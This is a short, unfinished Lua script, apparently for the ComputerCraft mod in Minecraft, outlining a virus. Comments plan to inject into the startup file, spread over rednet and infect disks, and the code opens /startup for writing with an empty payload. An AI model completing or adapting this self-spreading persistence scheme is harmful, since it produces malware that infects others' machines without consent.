-- Inject into startup.
-- Spread via rednet if possible
-- infect disks
-- maybe use _G.fs to offload files?
payload = ""
if fs.exists("/startup") then
    vic = fs.open("/startup","a")
else
    vic = fs.open("/startup","w")
end